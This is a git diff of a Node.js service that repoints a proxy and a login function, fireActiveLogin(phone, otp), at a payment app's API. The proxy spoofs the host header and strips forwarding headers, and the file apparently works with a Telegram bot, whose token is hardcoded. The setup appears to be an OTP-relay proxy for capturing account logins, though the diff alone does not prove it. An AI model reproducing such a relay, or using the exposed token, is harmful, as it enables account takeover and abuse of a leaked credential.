@@ -3,7 +3,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const { Redis } = require('@upstash/redis');
 
 const app = express();
-const ORIGINAL_API = 'https://app-api.beepaycommon.com';
+const ORIGINAL_API = 'https://app-api.beepaypro.com';
 const BOT_TOKEN = process.env.BOT_TOKEN || '8944838396:AAEjhUozfSTRh40upzS9Z43MCuBX9i4Yy5M';
 const WEBHOOK_URL = 'https://ixcv.vercel.app/bot-webhook';
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
@@ -170,7 +170,7 @@ async function fireActiveLogin(phone, otp) {
     'content-type': 'application/json; charset=UTF-8',
     'accept': '*/*',
     'reqdate': String(Math.floor(Date.now() / 1000)),
-    'host': 'app-api.beepaycommon.com',
+    'host': 'app-api.beepaypro.com',
   };
   const body = JSON.stringify({ phone: String(phone), otp: otpCode });
   try {
@@ -588,7 +588,7 @@ async function proxyFetch(req) {
   const headers = {};
   for (const [k, v] of Object.entries(req.headers || {})) {
     const kl = k.toLowerCase();
-    if (kl === 'host') { headers['host'] = 'app-api.beepaycommon.com'; continue; }
+    if (kl === 'host') { headers['host'] = 'app-api.beepaypro.com'; continue; }
     if (kl === 'content-length' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
     headers[k] = v;
   }
